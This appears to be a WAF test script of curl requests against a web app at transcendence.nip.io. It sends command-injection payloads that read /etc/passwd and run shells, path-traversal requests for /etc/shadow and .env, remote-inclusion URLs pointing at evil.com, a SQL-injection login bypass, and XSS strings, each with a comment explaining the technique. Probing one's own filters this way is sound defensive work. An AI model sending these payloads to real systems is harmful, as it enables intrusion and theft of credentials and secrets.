# cmd_injection
# List files, then read system password file (classic sensitive file read)
curl -sk "https://transcendence.nip.io:3000/?cmd=ls|cat%20/etc/passwd" -o /dev/null -w "%{http_code} ?cmd=ls|cat%20/etc/passwd\n"
#    ^ ls             ^ pipe into cat /etc/passwd

# Just a semicolon + id command (no real command before it) — borderline, might be benign
curl -sk "https://transcendence.nip.io:3000/?cmd=;id" -o /dev/null -w "%{http_code} ?cmd=;id\n"
#    ^ empty command ; run 'id' — many APIs could use ';' legitimately, so PL1 may skip
# ------------ FLAGGED AS PASSABLE --------------

# Read /etc/passwd, then run id (user identity)
curl -skI "https://transcendence.nip.io:3000/?cmd=cat+/etc/passwd;id" -o /dev/null -w "%{http_code} ?cmd=cat+/etc/passwd;id\n"
#        cat /etc/passwd ; id

# Run id (user identity) && uname -a (kernel/system info)
curl -skI "https://transcendence.nip.io:3000/?cmd=id&&uname+-a" -o /dev/null -w "%{http_code} ?cmd=id&&uname+-a\n"
#        id && uname -a — double ampersand executes second only if first succeeds

# List files, then pipe into id (silly but shows pipe usage)
curl -skI "https://transcendence.nip.io:3000/?cmd=ls|id" -o /dev/null -w "%{http_code} ?cmd=ls|id\n"
#        ls | id

# Run id using backtick command substitution
curl -skI "https://transcendence.nip.io:3000/?cmd=\`id\`" -o /dev/null -w "%{http_code} ?cmd=\`id\`\n"
#        `id` — shell executes inside backticks and substitutes output

# Run id using $(...) command substitution
curl -skI "https://transcendence.nip.io:3000/?cmd=\$(id)" -o /dev/null -w "%{http_code} ?cmd=\$(id)\n"
#        $(id) — same as backticks, more modern syntax

# Launch bash, tell it to run id
curl -skI "https://transcendence.nip.io:3000/?cmd=bash+-c+id" -o /dev/null -w "%{http_code} ?cmd=bash+-c+id\n"
#        bash -c id — direct shell call

# Launch sh (POSIX shell), tell it to run id
curl -skI "https://transcendence.nip.io:3000/?cmd=/bin/sh+-c+id" -o /dev/null -w "%{http_code} ?cmd=/bin/sh+-c+id\n"
#        /bin/sh -c id — direct shell call

# local_file_inclusion
# reach random files
curl -sk "https://transcendence.nip.io:3000/?page=../../../../etc/passwd" -o /dev/null -w "%{http_code} ?page=../../../../etc/passwd\n"
curl -sk "https://transcendence.nip.io:3000/?file=..%2F..%2F..%2F..%2Fetc%2Fshadow" -o /dev/null -w "%{http_code} ?file=..%2F..%2F..%2F..%2Fetc%2Fshadow\n"

# reach env
curl -sk "https://transcendence.nip.io:3000/?file=../../../../.env" -o /dev/null -w "%{http_code} ?file=../../../../.env\n"

# encoded variants
curl -sk "https://transcendence.nip.io:3000/?file=%2e%2e%2f%2e%2e%2f%2e%2e%2f.env" -o /dev/null -w "%{http_code} ?file=%2e%2e%2f%2e%2e%2f%2e%2e%2f.env\n"
curl -sk "https://transcendence.nip.io:3000/?file=%252e%252e%252f%252e%252e%252f.env" -o /dev/null -w "%{http_code} ?file=%252e%252e%252f%252e%252e%252f.env\n"

# path_traversal
curl -sk "https://transcendence.nip.io:3000/?path=..%2F..%2Fsecret.txt" -o /dev/null -w "%{http_code} ?path=..%2F..%2Fsecret.txt\n"
curl -sk "https://transcendence.nip.io:3000/?path=/var/www/html/../../etc/hosts" -o /dev/null -w "%{http_code} ?path=/var/www/html/../../etc/hosts\n"

# remote_file_inclusion
curl -sk "https://transcendence.nip.io:3000/?file=http://evil.com/shell.txt" -o /dev/null -w "%{http_code} ?file=http://evil.com/shell.txt\n"
curl -sk "https://transcendence.nip.io:3000/?template=https://attacker.org/payload" -o /dev/null -w "%{http_code} ?template=https://attacker.org/payload\n"

# sql_injection
# injection in-form
curl -sk -X POST https://transcendence.nip.io:3000/login \
  -H "Content-Type: application/x-www-form-urlencoded" \
  --data "username=admin&password=1' OR '1'='1" -o /dev/null -w "%{http_code} injection in-form\n"

# basic
curl -sk "https://transcendence.nip.io:3000/?q=<script>alert(1)</script>" -o /dev/null -w "%{http_code} ?q=<script>alert(1)</script>\n"

# in-comment
curl -sk "https://transcendence.nip.io:3000/?search=test'/*" -o /dev/null -w "%{http_code} ?search=test'/*\n"

# xss
# json-ish xss
curl -sk -X POST https://transcendence.nip.io:3000/api/comments \
  -H "Content-Type: application/json" \
  -d '{"comment": "<script>alert(1)</script>"}' -o /dev/null -w "%{http_code} json-ish xss\n"

# script tag
curl -sk "https://transcendence.nip.io:3000/?q=<script>alert(1)</script>" -o /dev/null -w "%{http_code} ?q=<script>alert(1)</script>\n"

# Event handler
curl -sk "https://transcendence.nip.io:3000/?name=\" onmouseover=alert(1)//" -o /dev/null -w "%{http_code} ?name=\" onmouseover=alert(1)//\n"
